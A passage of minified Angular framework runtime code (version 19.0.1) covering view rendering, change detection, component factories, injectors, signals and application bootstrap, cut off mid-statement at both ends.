o=="number")break;if(n.hasOwnProperty(o)){r===null&&(r=[]);let s=n[o];for(let a=0;a<s.length;a+=3)if(s[a]===e){r.push(o,s[a+1],s[a+2],t[i+1]);break}}i+=2}return r}function dO(n,e,t,r){return[n,!0,0,e,null,r,null,t,null,null]}function Ib(n,e){let t=n.contentQueries;if(t!==null){let r=De(null);try{for(let i=0;i<t.length;i+=2){let o=t[i],s=t[i+1];if(s!==-1){let a=n.data[s];mC(o),a.contentQueries(2,e[s],s)}}}finally{De(r)}}}function cy(n,e){return n[ac]?n[YD][In]=e:n[ac]=e,n[YD]=e,e}function wm(n,e,t){mC(0);let r=De(null);try{e(n,t)}finally{De(r)}}function hO(n){return n[ad]??=[]}function fO(n){return n.cleanup??=[]}function Db(n,e){let t=n[rs],r=t?t.get(ur,null):null;r&&r.handleError(e)}function uy(n,e,t,r,i){for(let o=0;o<t.length;){let s=t[o++],a=t[o++],c=t[o++],l=e[s],h=n.data[s];fb(h,l,r,a,c,i)}}function pO(n,e,t){let r=cC(e,n);ck(n[mt],r,t)}function gO(n,e){let t=Jr(e,n),r=t[fe];mO(r,t);let i=t[hr];i!==null&&t[sd]===null&&(t[sd]=ey(i,t[rs])),Cb(r,t,t[ar])}function mO(n,e){for(let t=e.length;t<n.blueprint.length;t++)e.push(n.blueprint[t])}function Cb(n,e,t){Bm(e);try{let r=n.viewQuery;r!==null&&wm(1,r,t);let i=n.template;i!==null&&gb(n,e,i,1,t),n.firstCreatePass&&(n.firstCreatePass=!1),e[kd]?.finishViewCreation(n),n.staticContentQueries&&Ib(n,e),n.staticViewQueries&&wm(2,n.viewQuery,t);let o=n.components;o!==null&&yO(e,o)}catch(r){throw n.firstCreatePass&&(n.incompleteFirstPass=!0,n.firstCreatePass=!1),r}finally{e[te]&=-5,$m()}}function yO(n,e){for(let t=0;t<e.length;t++)gO(n,e[t])}function m0(n,e){return!e||e.firstChild===null||qC(n)}function vO(n,e,t,r=!0){let i=e[fe];if(hk(i,e,n,t),r){let s=vm(t,n),a=e[mt],c=ob(a,n[qi]);c!==null&&lk(i,n[Dn],a,e,c,s)}let o=e[sd];o!==null&&o.firstChild!==null&&(o.firstChild=null)}function wd(n,e,t,r,i=!1){for(;t!==null;){if(t.type===128){t=i?t.projectionNext:t.next;continue}let o=e[t.index];o!==null&&r.push(Un(o)),fr(o)&&_O(o,r);let s=t.type;if(s&8)wd(n,e,t.child,r);else if(s&32){let a=ny(t,e),c;for(;c=a();)r.push(c)}else if(s&16){let a=ab(e,t);if(Array.isArray(a))r.push(...a);else{let c=zi(e[Ln]);wd(c[fe],c,a,r,!0)}}t=i?t.projectionNext:t.next}return r}function _O(n,e){for(let t=un;t<n.length;t++){let r=n[t],i=r[fe].firstChild;i!==null&&wd(r[fe],r,i,e)}n[qi]!==n[hr]&&e.push(n[qi])}var bb=[];function wO(n){return n[Zt]??EO(n)}function EO(n){let e=bb.pop()??Object.create(DO);return e.lView=n,e}function IO(n){n.lView[Zt]!==n&&(n.lView=null,bb.push(n))}var DO=ue(U({},Ka),{consumerIsAlwaysLive:!0,consumerMarkedDirty:n=>{Ld(n.lView)},consumerOnSignalRead(){this.lView[Zt]=this}});function CO(n){let e=n[Zt]??Object.create(bO);return e.lView=n,e}var bO=ue(U({},Ka),{consumerIsAlwaysLive:!0,consumerMarkedDirty:n=>{let e=zi(n.lView);for(;e&&!Tb(e[fe]);)e=zi(e);e&&Um(e)},consumerOnSignalRead(){this.lView[Zt]=this}});function Tb(n){return n.type!==2}function Sb(n){if(n[cd]===null)return;let e=!0;for(;e;){let t=!1;for(let r of n[cd])r.dirty&&(t=!0,r.zone===null||Zone.current===r.zone?r.run():r.zone.run(()=>r.run()));e=t&&!!(n[te]&8192)}}var TO=100;function Ab(n,e=!0,t=0){let i=n[Kr].rendererFactory,o=!1;o||i.begin?.();try{SO(n,t)}catch(s){throw e&&Db(n,s),s}finally{o||i.end?.()}}function SO(n,e){let t=gC();try{XD(!0),Em(n,e);let r=0;for(;Vd(n);){if(r===TO)throw new Y(103,!1);r++,Em(n,1)}}finally{XD(t)}}function AO(n,e,t,r){let i=e[te];if((i&256)===256)return;let o=!1,s=!1;Bm(e);let a=!0,c=null,l=null;o||(Tb(n)?(l=wO(e),c=ml(l)):dD()===null?(a=!1,l=CO(e),c=ml(l)):e[Zt]&&(pg(e[Zt]),e[Zt]=null));try{lC(e),d1(n.bindingStartIndex),t!==null&&gb(n,e,t,2,r);let h=(i&3)===3;if(!o)if(h){let y=n.preOrderCheckHooks;y!==null&&Xl(e,y,null)}else{let y=n.preOrderHooks;y!==null&&ed(e,y,0,null),Lg(e,0)}if(s||MO(e),Sb(e),Mb(e,0),n.contentQueries!==null&&Ib(n,e),!o)if(h){let y=n.contentCheckHooks;y!==null&&Xl(e,y)}else{let y=n.contentHooks;y!==null&&ed(e,y,1),Lg(e,1)}Vk(n,e);let p=n.components;p!==null&&Rb(e,p,0);let m=n.viewQuery;if(m!==null&&wm(2,m,r),!o)if(h){let y=n.viewCheckHooks;y!==null&&Xl(e,y)}else{let y=n.viewHooks;y!==null&&ed(e,y,2),Lg(e,2)}if(n.firstUpdatePass===!0&&(n.firstUpdatePass=!1),e[Vg]){for(let y of e[Vg])y();e[Vg]=null}o||(e[te]&=-73)}catch(h){throw o||Ld(e),h}finally{l!==null&&(hg(l,c),a&&IO(l)),$m()}}function Mb(n,e){for(let t=WC(n);t!==null;t=KC(t))for(let r=un;r<t.length;r++){let i=t[r];xb(i,e)}}function MO(n){for(let e=WC(n);e!==null;e=KC(e)){if(!(e[te]&dd.HasTransplantedViews))continue;let t=e[ld];for(let r=0;r<t.length;r++){let i=t[r];Um(i)}}}function xO(n,e,t){let r=Jr(e,n);xb(r,t)}function xb(n,e){Lm(n)&&Em(n,e)}function Em(n,e){let r=n[fe],i=n[te],o=n[Zt],s=!!(e===0&&i&16);if(s||=!!(i&64&&e===0),s||=!!(i&1024),s||=!!(o?.dirty&&fg(o)),s||=!1,o&&(o.dirty=!1),n[te]&=-9217,s)AO(r,n,r.template,n[ar]);else if(i&8192){Sb(n),Mb(n,1);let a=r.components;a!==null&&Rb(n,a,1)}}function Rb(n,e,t){for(let r=0;r<e.length;r++)xO(n,e[r],t)}function ly(n,e){let t=gC()?64:1088;for(n[Kr].changeDetectionScheduler?.notify(e);n;){n[te]|=t;let r=zi(n);if(em(n)&&!r)return n;n=r}return null}var as=class{_lView;_cdRefInjectingView;notifyErrorHandler;_appRef=null;_attachedToViewContainer=!1;get rootNodes(){let e=this._lView,t=e[fe];return wd(t,e,t.firstChild,[])}constructor(e,t,r=!0){this._lView=e,this._cdRefInjectingView=t,this.notifyErrorHandler=r}get context(){return this._lView[ar]}get dirty(){return!!(this._lView[te]&9280)||!!this._lView[Zt]?.dirty}set context(e){this._lView[ar]=e}get destroyed(){return(this._lView[te]&256)===256}destroy(){if(this._appRef)this._appRef.detachView(this);else if(this._attachedToViewContainer){let e=this._lView[kt];if(fr(e)){let t=e[ud],r=t?t.indexOf(this):-1;r>-1&&(ym(e,r),id(t,r))}this._attachedToViewContainer=!1}rb(this._lView[fe],this._lView)}onDestroy(e){dC(this._lView,e)}markForCheck(){ly(this._cdRefInjectingView||this._lView,4)}markForRefresh(){Um(this._cdRefInjectingView||this._lView)}detach(){this._lView[te]&=-129}reattach(){nm(this._lView),this._lView[te]|=128}detectChanges(){this._lView[te]|=1024,Ab(this._lView,this.notifyErrorHandler)}checkNoChanges(){}attachToViewContainerRef(){if(this._appRef)throw new Y(902,!1);this._attachedToViewContainer=!0}detachFromAppRef(){this._appRef=null;let e=em(this._lView),t=this._lView[cc];t!==null&&!e&&ry(t,this._lView),tb(this._lView[fe],this._lView)}attachToAppRef(e){if(this._attachedToViewContainer)throw new Y(902,!1);this._appRef=e;let t=em(this._lView),r=this._lView[cc];r!==null&&!t&&nb(r,this._lView),nm(this._lView)}};var y5=new RegExp(`^(\\d+)*(${X1}|${J1})*(.*)`);var RO=()=>null;function y0(n,e){return RO(n,e)}var Im=class{},Ed=class{},Dm=class{resolveComponentFactory(e){throw Error(`No component factory found for ${Ht(e)}.`)}},cs=class{static NULL=new Dm},us=class{},ms=(()=>{class n{destroyNode=null;static __NG_ELEMENT_ID__=()=>NO()}return n})();function NO(){let n=Ge(),e=Xt(),t=Jr(e.index,n);return(Gr(t)?t:n)[mt]}var PO=(()=>{class n{static \u0275prov=W({token:n,providedIn:"root",factory:()=>null})}return n})();function Cm(n,e,t){let r=t?n.styles:null,i=t?n.classes:null,o=0;if(e!==null)for(let s=0;s<e.length;s++){let a=e[s];if(typeof a=="number")o=a;else if(o==1)i=qD(i,a);else if(o==2){let c=a,l=e[++s];r=qD(r,c+": "+l+";")}}t?n.styles=r:n.stylesWithoutHost=r,t?n.classes=i:n.classesWithoutHost=i}var Id=class extends cs{ngModule;constructor(e){super(),this.ngModule=e}resolveComponentFactory(e){let t=Wr(e);return new ls(t,this.ngModule)}};function v0(n,e){let t=[];for(let r in n){if(!n.hasOwnProperty(r))continue;let i=n[r];if(i===void 0)continue;let o=Array.isArray(i),s=o?i[0]:i,a=o?i[1]:Yr.None;e?t.push({propName:s,templateName:r,isSignal:(a&Yr.SignalBased)!==0}):t.push({propName:s,templateName:r})}return t}function kO(n){let e=n.toLowerCase();return e==="svg"?ZP:e==="math"?JP:null}var ls=class extends Ed{componentDef;ngModule;selector;componentType;ngContentSelectors;isBoundToModule;get inputs(){let e=this.componentDef,t=e.inputTransforms,r=v0(e.inputs,!0);if(t!==null)for(let i of r)t.hasOwnProperty(i.propName)&&(i.transform=t[i.propName]);return r}get outputs(){return v0(this.componentDef.outputs,!1)}constructor(e,t){super(),this.componentDef=e,this.ngModule=t,this.componentType=e.type,this.selector=Ok(e.selectors),this.ngContentSelectors=e.ngContentSelectors?e.ngContentSelectors:[],this.isBoundToModule=!!t}create(e,t,r,i){let o=De(null);try{i=i||this.ngModule;let s=i instanceof Pt?i:i?.injector;s&&this.componentDef.getStandaloneInjector!==null&&(s=this.componentDef.getStandaloneInjector(s)||s);let a=s?new sm(e,s):e,c=a.get(us,null);if(c===null)throw new Y(407,!1);let l=a.get(PO,null),h=a.get(os,null),p={rendererFactory:c,sanitizer:l,changeDetectionScheduler:h},m=c.createRenderer(null,this.componentDef),y=this.componentDef.selectors[0][0]||"div",D=r?$k(m,r,this.componentDef.encapsulation,a):eb(m,y,kO(y)),b=512;this.componentDef.signals?b|=4096:this.componentDef.onPush||(b|=16);let T=null;D!==null&&(T=ey(D,a,!0));let F=vb(0,null,null,1,0,null,null,null,null,null,null),$=sy(null,F,null,b,null,null,p,m,a,null,T);Bm($);let P,G,Z=null;try{let K=this.componentDef,E,v=null;K.findHostDirectiveDefs?(E=[],v=new Map,K.findHostDirectiveDefs(K,E,v),E.push(K)):E=[K];let w=OO($,D);Z=FO(w,D,K,E,$,p,m),G=uC(F,cr),D&&UO(m,K,D,r),t!==void 0&&jO(G,this.ngContentSelectors,t),P=LO(Z,K,E,v,$,[BO]),Cb(F,$,null)}catch(K){throw Z!==null&&fm(Z),fm($),K}finally{$m()}return new bm(this.componentType,P,Km(G,$),$,G)}finally{De(o)}}},bm=class extends Im{location;_rootLView;_tNode;instance;hostView;changeDetectorRef;componentType;previousInputValues=null;constructor(e,t,r,i,o){super(),this.location=r,this._rootLView=i,this._tNode=o,this.instance=t,this.hostView=this.changeDetectorRef=new as(i,void 0,!1),this.componentType=e}setInput(e,t){let r=this._tNode.inputs,i;if(r!==null&&(i=r[e])){if(this.previousInputValues??=new Map,this.previousInputValues.has(e)&&Object.is(this.previousInputValues.get(e),t))return;let o=this._rootLView;uy(o[fe],o,i,e,t),this.previousInputValues.set(e,t);let s=Jr(this._tNode.index,o);ly(s,1)}}get injector(){return new $i(this._tNode,this._rootLView)}destroy(){this.hostView.destroy()}onDestroy(e){this.hostView.onDestroy(e)}};function OO(n,e){let t=n[fe],r=cr;return n[r]=e,ay(t,r,2,"#host",null)}function FO(n,e,t,r,i,o,s){let a=i[fe];VO(r,n,e,s);let c=null;e!==null&&(c=ey(e,i[rs]));let l=o.rendererFactory.createRenderer(e,t),h=sy(i,yb(t),null,Eb(t),i[n.index],n,o,l,null,null,c);return a.firstCreatePass&&_m(a,n,r.length-1),cy(i,h),i[n.index]=h}function VO(n,e,t,r){for(let i of n)e.mergedAttrs=uc(e.mergedAttrs,i.hostAttrs);e.mergedAttrs!==null&&(Cm(e,e.mergedAttrs,!0),t!==null&&ub(r,t,e))}function LO(n,e,t,r,i,o){let s=Xt(),a=i[fe],c=ln(s,i);_b(a,i,s,t,null,r);for(let h=0;h<t.length;h++){let p=s.directiveStart+h,m=is(i,a,p,s);ss(m,i)}wb(a,i,s),c&&ss(c,i);let l=is(i,a,s.directiveStart+s.componentOffset,s);if(n[ar]=i[ar]=l,o!==null)for(let h of o)h(l,e);return mb(a,s,i),l}function UO(n,e,t,r){if(r)om(n,t,["ng-version","19.0.1"]);else{let{attrs:i,classes:o}=Fk(e.selectors[0]);i&&om(n,t,i),o&&o.length>0&&cb(n,t,o.join(" "))}}function jO(n,e,t){let r=n.projection=[];for(let i=0;i<e.length;i++){let o=t[i];r.push(o!=null&&o.length?Array.from(o):null)}}function BO(){let n=Xt();TC(Ge()[fe],n)}var $d=(()=>{class n{static __NG_ELEMENT_ID__=$O}return n})();function $O(){let n=Xt();return qO(n,Ge())}var HO=$d,Nb=class extends HO{_lContainer;_hostTNode;_hostLView;constructor(e,t,r){super(),this._lContainer=e,this._hostTNode=t,this._hostLView=r}get element(){return Km(this._hostTNode,this._hostLView)}get injector(){return new $i(this._hostTNode,this._hostLView)}get parentInjector(){let e=Hm(this._hostTNode,this._hostLView);if(AC(e)){let t=fd(e,this._hostLView),r=hd(e),i=t[fe].data[r+8];return new $i(i,t)}else return new $i(null,this._hostLView)}clear(){for(;this.length>0;)this.remove(this.length-1)}get(e){let t=_0(this._lContainer);return t!==null&&t[e]||null}get length(){return this._lContainer.length-un}createEmbeddedView(e,t,r){let i,o;typeof r=="number"?i=r:r!=null&&(i=r.index,o=r.injector);let s=y0(this._lContainer,e.ssrId),a=e.createEmbeddedViewImpl(t||{},o,s);return this.insertImpl(a,i,m0(this._hostTNode,s)),a}createComponent(e,t,r,i,o){let s=e&&!WP(e),a;if(s)a=t;else{let D=t||{};a=D.index,r=D.injector,i=D.projectableNodes,o=D.environmentInjector||D.ngModuleRef}let c=s?e:new ls(Wr(e)),l=r||this.parentInjector;if(!o&&c.ngModule==null){let b=(s?l:this.parentInjector).get(Pt,null);b&&(o=b)}let h=Wr(c.componentType??{}),p=y0(this._lContainer,h?.id??null),m=p?.firstChild??null,y=c.create(l,i,m,o);return this.insertImpl(y.hostView,a,m0(this._hostTNode,p)),y}insert(e,t){return this.insertImpl(e,t,!0)}insertImpl(e,t,r){let i=e._lView;if(e1(i)){let a=this.indexOf(e);if(a!==-1)this.detach(a);else{let c=i[kt],l=new Nb(c,c[Dn],c[kt]);l.detach(l.indexOf(e))}}let o=this._adjustIndex(t),s=this._lContainer;return vO(s,i,o,r),e.attachToViewContainerRef(),$0($g(s),o,e),e}move(e,t){return this.insert(e,t)}indexOf(e){let t=_0(this._lContainer);return t!==null?t.indexOf(e):-1}remove(e){let t=this._adjustIndex(e,-1),r=ym(this._lContainer,t);r&&(id($g(this._lContainer),t),rb(r[fe],r))}detach(e){let t=this._adjustIndex(e,-1),r=ym(this._lContainer,t);return r&&id($g(this._lContainer),t)!=null?new as(r):null}_adjustIndex(e,t=0){return e??this.length+t}};function _0(n){return n[ud]}function $g(n){return n[ud]||(n[ud]=[])}function qO(n,e){let t,r=e[n.index];return fr(r)?t=r:(t=dO(r,e,null,n),e[n.index]=t,cy(e,t)),GO(t,e,n,r),new Nb(t,n,e)}function zO(n,e){let t=n[mt],r=t.createComment(""),i=ln(e,n),o=ob(t,i);return _d(t,o,r,yk(t,i),!1),r}var GO=WO;function WO(n,e,t,r){if(n[qi])return;let i;t.type&8?i=Un(r):i=zO(e,t),n[qi]=i}function KO(n){return typeof n=="function"&&n[Qt]!==void 0}function mc(n,e){gs("NgSignals");let t=ED(n),r=t[Qt];return e?.equal&&(r.equal=e.equal),t.set=i=>_l(r,i),t.update=i=>ID(r,i),t.asReadonly=QO.bind(t),t}function QO(){let n=this[Qt];if(n.readonlyFn===void 0){let e=()=>this();e[Qt]=n,n.readonlyFn=e}return n.readonlyFn}function Pb(n){return KO(n)&&typeof n.set=="function"}function YO(n){let e=[],t=new Map;function r(i){let o=t.get(i);if(!o){let s=n(i);t.set(i,o=s.then(eF))}return o}return Dd.forEach((i,o)=>{let s=[];i.templateUrl&&s.push(r(i.templateUrl).then(l=>{i.template=l}));let a=typeof i.styles=="string"?[i.styles]:i.styles||[];if(i.styles=a,i.styleUrl&&i.styleUrls?.length)throw new Error("@Component cannot define both `styleUrl` and `styleUrls`. Use `styleUrl` if the component has one stylesheet, or `styleUrls` if it has multiple");if(i.styleUrls?.length){let l=i.styles.length,h=i.styleUrls;i.styleUrls.forEach((p,m)=>{a.push(""),s.push(r(p).then(y=>{a[l+m]=y,h.splice(h.indexOf(p),1),h.length==0&&(i.styleUrls=void 0)}))})}else i.styleUrl&&s.push(r(i.styleUrl).then(l=>{a.push(l),i.styleUrl=void 0}));let c=Promise.all(s).then(()=>tF(o));e.push(c)}),JO(),Promise.all(e).then(()=>{})}var Dd=new Map,ZO=new Set;function JO(){let n=Dd;return Dd=new Map,n}function XO(){return Dd.size===0}function eF(n){return typeof n=="string"?n:n.text()}function tF(n){ZO.delete(n)}var Zr=class{},lc=class{};var Cd=class extends Zr{ngModuleType;_parent;_bootstrapComponents=[];_r3Injector;instance;destroyCbs=[];componentFactoryResolver=new Id(this);constructor(e,t,r,i=!0){super(),this.ngModuleType=e,this._parent=t;let o=z0(e);this._bootstrapComponents=XC(o.bootstrap),this._r3Injector=VC(e,t,[{provide:Zr,useValue:this},{provide:cs,useValue:this.componentFactoryResolver},...r],Ht(e),new Set(["environment"])),i&&this.resolveInjectorInitializers()}resolveInjectorInitializers(){this._r3Injector.resolveInjectorInitializers(),this.instance=this._r3Injector.get(this.ngModuleType)}get injector(){return this._r3Injector}destroy(){let e=this._r3Injector;!e.destroyed&&e.destroy(),this.destroyCbs.forEach(t=>t()),this.destroyCbs=null}onDestroy(e){this.destroyCbs.push(e)}},bd=class extends lc{moduleType;constructor(e){super(),this.moduleType=e}create(e){return new Cd(this.moduleType,e,[])}};function nF(n,e,t){return new Cd(n,e,t,!1)}var Tm=class extends Zr{injector;componentFactoryResolver=new Id(this);instance=null;constructor(e){super();let t=new sc([...e.providers,{provide:Zr,useValue:this},{provide:cs,useValue:this.componentFactoryResolver}],e.parent||Vm(),e.debugName,new Set(["environment"]));this.injector=t,e.runEnvironmentInitializers&&t.resolveInjectorInitializers()}destroy(){this.injector.destroy()}onDestroy(e){this.injector.onDestroy(e)}};function Hd(n,e,t=null){return new Tm({providers:n,parent:e,debugName:t,runEnvironmentInitializers:!0}).injector}var rF=(()=>{class n{_injector;cachedInjectors=new Map;constructor(t){this._injector=t}getOrCreateStandaloneInjector(t){if(!t.standalone)return null;if(!this.cachedInjectors.has(t)){let r=Q0(!1,t.type),i=r.length>0?Hd([r],this._injector,`Standalone[${t.type.name}]`):null;this.cachedInjectors.set(t,i)}return this.cachedInjectors.get(t)}ngOnDestroy(){try{for(let t of this.cachedInjectors.values())t!==null&&t.destroy()}finally{this.cachedInjectors.clear()}}static \u0275prov=W({token:n,providedIn:"environment",factory:()=>new n(L(Pt))})}return n})();function Bn(n){return hc(()=>{let e=Ob(n),t=ue(U({},e),{decls:n.decls,vars:n.vars,template:n.template,consts:n.consts||null,ngContentSelectors:n.ngContentSelectors,onPush:n.changeDetection===zC.OnPush,directiveDefs:null,pipeDefs:null,dependencies:e.standalone&&n.dependencies||null,getStandaloneInjector:e.standalone?i=>i.get(rF).getOrCreateStandaloneInjector(t):null,getExternalStyles:null,signals:n.signals??!1,data:n.data||{},encapsulation:n.encapsulation||jn.Emulated,styles:n.styles||cn,_:null,schemas:n.schemas||null,tView:null,id:""});e.standalone&&gs("NgStandalone"),Fb(t);let r=n.dependencies;return t.directiveDefs=E0(r,!1),t.pipeDefs=E0(r,!0),t.id=sF(t),t})}function iF(n){return Wr(n)||G0(n)}function oF(n){return n!==null}function Qe(n){return hc(()=>({type:n.type,bootstrap:n.bootstrap||cn,declarations:n.declarations||cn,imports:n.imports||cn,exports:n.exports||cn,transitiveCompileScopes:null,schemas:n.schemas||null,id:n.id||null}))}function w0(n,e){if(n==null)return es;let t={};for(let r in n)if(n.hasOwnProperty(r)){let i=n[r],o,s,a=Yr.None;Array.isArray(i)?(a=i[0],o=i[1],s=i[2]??o):(o=i,s=i),e?(t[o]=a!==Yr.None?[r,a]:r,e[o]=s):t[o]=r}return t}function zt(n){return hc(()=>{let e=Ob(n);return Fb(e),e})}function kb(n){return{type:n.type,name:n.name,factory:null,pure:n.pure!==!1,standalone:n.standalone??!0,onDestroy:n.type.prototype.ngOnDestroy||null}}function Ob(n){let e={};return{type:n.type,providersResolver:null,factory:null,hostBindings:n.hostBindings||null,hostVars:n.hostVars||0,hostAttrs:n.hostAttrs||null,contentQueries:n.contentQueries||null,declaredInputs:e,inputTransforms:null,inputConfig:n.inputs||es,exportAs:n.exportAs||null,standalone:n.standalone??!0,signals:n.signals===!0,selectors:n.selectors||cn,viewQuery:n.viewQuery||null,features:n.features||null,setInput:null,findHostDirectiveDefs:null,hostDirectives:null,inputs:w0(n.inputs,e),outputs:w0(n.outputs),debugInfo:null}}function Fb(n){n.features?.forEach(e=>e(n))}function E0(n,e){if(!n)return null;let t=e?W0:iF;return()=>(typeof n=="function"?n():n).map(r=>t(r)).filter(oF)}function sF(n){let e=0,t=typeof n.consts=="function"?"":n.consts,r=[n.selectors,n.ngContentSelectors,n.hostVars,n.hostAttrs,t,n.vars,n.decls,n.encapsulation,n.standalone,n.signals,n.exportAs,JSON.stringify(n.inputs),JSON.stringify(n.outputs),Object.getOwnPropertyNames(n.type.prototype),!!n.contentQueries,!!n.viewQuery];for(let o of r.join("|"))e=Math.imul(31,e)+o.charCodeAt(0)<<0;return e+=2147483648,"c"+e}function aF(n){return Object.getPrototypeOf(n.prototype).constructor}function gr(n){let e=aF(n.type),t=!0,r=[n];for(;e;){let i;if(Qr(n))i=e.\u0275cmp||e.\u0275dir;else{if(e.\u0275cmp)throw new Y(903,!1);i=e.\u0275dir}if(i){if(t){r.push(i);let s=n;s.inputs=Kl(n.inputs),s.inputTransforms=Kl(n.inputTransforms),s.declaredInputs=Kl(n.declaredInputs),s.outputs=Kl(n.outputs);let a=i.hostBindings;a&&hF(n,a);let c=i.viewQuery,l=i.contentQueries;if(c&&lF(n,c),l&&dF(n,l),cF(n,i),hP(n.outputs,i.outputs),Qr(i)&&i.data.animation){let h=n.data;h.animation=(h.animation||[]).concat(i.data.animation)}}let o=i.features;if(o)for(let s=0;s<o.length;s++){let a=o[s];a&&a.ngInherit&&a(n),a===gr&&(t=!1)}}e=Object.getPrototypeOf(e)}uF(r)}function cF(n,e){for(let t in e.inputs){if(!e.inputs.hasOwnProperty(t)||n.inputs.hasOwnProperty(t))continue;let r=e.inputs[t];if(r!==void 0&&(n.inputs[t]=r,n.declaredInputs[t]=e.declaredInputs[t],e.inputTransforms!==null)){let i=Array.isArray(r)?r[0]:r;if(!e.inputTransforms.hasOwnProperty(i))continue;n.inputTransforms??={},n.inputTransforms[i]=e.inputTransforms[i]}}}function uF(n){let e=0,t=null;for(let r=n.length-1;r>=0;r--){let i=n[r];i.hostVars=e+=i.hostVars,i.hostAttrs=uc(i.hostAttrs,t=uc(t,i.hostAttrs))}}function Kl(n){return n===es?{}:n===cn?[]:n}function lF(n,e){let t=n.viewQuery;t?n.viewQuery=(r,i)=>{e(r,i),t(r,i)}:n.viewQuery=e}function dF(n,e){let t=n.contentQueries;t?n.contentQueries=(r,i,o)=>{e(r,i,o),t(r,i,o)}:n.contentQueries=e}function hF(n,e){let t=n.hostBindings;t?n.hostBindings=(r,i)=>{e(r,i),t(r,i)}:n.hostBindings=e}function fF(n,e,t){return n[e]=t}function yc(n,e,t){let r=n[e];return Object.is(r,t)?!1:(n[e]=t,!0)}function pF(n){return(n.flags&32)===32}var qd=(()=>{class n{log(t){console.log(t)}warn(t){console.warn(t)}static \u0275fac=function(r){return new(r||n)};static \u0275prov=W({token:n,factory:n.\u0275fac,providedIn:"platform"})}return n})();var dy=new j(""),vc=new j(""),zd=(()=>{class n{_ngZone;registry;_isZoneStable=!0;_callbacks=[];taskTrackingZone=null;constructor(t,r,i){this._ngZone=t,this.registry=r,hy||(gF(i),i.addToWindow(r)),this._watchAngularEvents(),t.run(()=>{this.taskTrackingZone=typeof Zone>"u"?null:Zone.current.get("TaskTrackingZone")})}_watchAngularEvents(){this._ngZone.onUnstable.subscribe({next:()=>{this._isZoneStable=!1}}),this._ngZone.runOutsideAngular(()=>{this._ngZone.onStable.subscribe({next:()=>{pe.assertNotInAngularZone(),queueMicrotask(()=>{this._isZoneStable=!0,this._runCallbacksIfReady()})}})})}isStable(){return this._isZoneStable&&!this._ngZone.hasPendingMacrotasks}_runCallbacksIfReady(){if(this.isStable())queueMicrotask(()=>{for(;this._callbacks.length!==0;){let t=this._callbacks.pop();clearTimeout(t.timeoutId),t.doneCb()}});else{let t=this.getPendingTasks();this._callbacks=this._callbacks.filter(r=>r.updateCb&&r.updateCb(t)?(clearTimeout(r.timeoutId),!1):!0)}}getPendingTasks(){return this.taskTrackingZone?this.taskTrackingZone.macroTasks.map(t=>({source:t.source,creationLocation:t.creationLocation,data:t.data})):[]}addCallback(t,r,i){let o=-1;r&&r>0&&(o=setTimeout(()=>{this._callbacks=this._callbacks.filter(s=>s.timeoutId!==o),t()},r)),this._callbacks.push({doneCb:t,timeoutId:o,updateCb:i})}whenStable(t,r,i){if(i&&!this.taskTrackingZone)throw new Error('Task tracking zone is required when passing an update callback to whenStable(). Is "zone.js/plugins/task-tracking" loaded?');this.addCallback(t,r,i),this._runCallbacksIfReady()}registerApplication(t){this.registry.registerApplication(t,this)}unregisterApplication(t){this.registry.unregisterApplication(t)}findProviders(t,r,i){return[]}static \u0275fac=function(r){return new(r||n)(L(pe),L(Gd),L(vc))};static \u0275prov=W({token:n,factory:n.\u0275fac})}return n})(),Gd=(()=>{class n{_applications=new Map;registerApplication(t,r){this._applications.set(t,r)}unregisterApplication(t){this._applications.delete(t)}unregisterAllApplications(){this._applications.clear()}getTestability(t){return this._applications.get(t)||null}getAllTestabilities(){return Array.from(this._applications.values())}getAllRootElements(){return Array.from(this._applications.keys())}findTestabilityInTree(t,r=!0){return hy?.findTestabilityInTree(this,t,r)??null}static \u0275fac=function(r){return new(r||n)};static \u0275prov=W({token:n,factory:n.\u0275fac,providedIn:"platform"})}return n})();function gF(n){hy=n}var hy;function Ji(n){return!!n&&typeof n.then=="function"}function Vb(n){return!!n&&typeof n.subscribe=="function"}var Wd=new j("");var Lb=(()=>{class n{resolve;reject;initialized=!1;done=!1;donePromise=new Promise((t,r)=>{this.resolve=t,this.reject=r});appInits=V(Wd,{optional:!0})??[];injector=V(Jt);constructor(){}runInitializers(){if(this.initialized)return;let t=[];for(let i of this.appInits){let o=qt(this.injector,i);if(Ji(o))t.push(o);else if(Vb(o)){let s=new Promise((a,c)=>{o.subscribe({complete:a,error:c})});t.push(s)}}let r=()=>{this.done=!0,this.resolve()};Promise.all(t).then(()=>{r()}).catch(i=>{this.reject(i)}),t.length===0&&r(),this.initialized=!0}static \u0275fac=function(r){return new(r||n)};static \u0275prov=W({token:n,factory:n.\u0275fac,providedIn:"root"})}return n})(),mF=(()=>{class n{static \u0275prov=W({token:n,providedIn:"root",factory:()=>new Sm})}return n})(),Sm=class{queuedEffectCount=0;queues=new Map;schedule(e){this.enqueue(e)}enqueue(e){let t=e.zone;this.queues.has(t)||this.queues.set(t,new Set);let r=this.queues.get(t);r.has(e)||(this.queuedEffectCount++,r.add(e))}flush(){for(;this.queuedEffectCount>0;)for(let[e,t]of this.queues)e===null?this.flushQueue(t):e.run(()=>this.flushQueue(t))}flushQueue(e){for(let t of e)e.delete(t),this.queuedEffectCount--,t.run()}},Kd=new j("");function yF(){wD(()=>{throw new Y(600,!1)})}function vF(n){return n.isBoundToModule}var _F=10;function wF(n,e,t){try{let r=t();return Ji(r)?r.catch(i=>{throw e.runOutsideAngular(()=>n.handleError(i)),i}):r}catch(r){throw e.runOutsideAngular(()=>n.handleError(r)),r}}function Ub(n,e){return Array.isArray(e)?e.reduce(Ub,n):U(U({},n),e)}var mr=(()=>{class n{_runningTick=!1;_destroyed=!1;_destroyListeners=[];_views=[];internalErrorHandler=V(q1);afterRenderManager=V(JC);zonelessEnabled=V(zm);rootEffectScheduler=V(mF);dirtyFlags=0;deferredDirtyFlags=0;tracingSnapshot=null;externalTestViews=new Set;afterTick=new Ve;get allViews(){return[...this.externalTestViews.keys(),...this._views]}get destroyed(){return this._destroyed}componentTypes=[];components=[];isStable=V(pr).hasPendingTasks.pipe(X(t=>!t));constructor(){V(jd,{optional:!0})}whenStable(){let t;return new Promise(r=>{t=this.isStable.subscribe({next:i=>{i&&r()}})}).finally(()=>{t.unsubscribe()})}_injector=V(Pt);get injector(){return this._injector}bootstrap(t,r){let i=t instanceof Ed;if(!this._injector.get(Lb).done){let m=!i&&K0(t),y=!1;throw new Y(405,y)}let s;i?s=t:s=this._injector.get(cs).resolveComponentFactory(t),this.componentTypes.push(s.componentType);let a=vF(s)?void 0:this._injector.get(Zr),c=r||s.selector,l=s.create(Jt.NULL,[],c,a),h=l.location.nativeElement,p=l.injector.get(dy,null);return 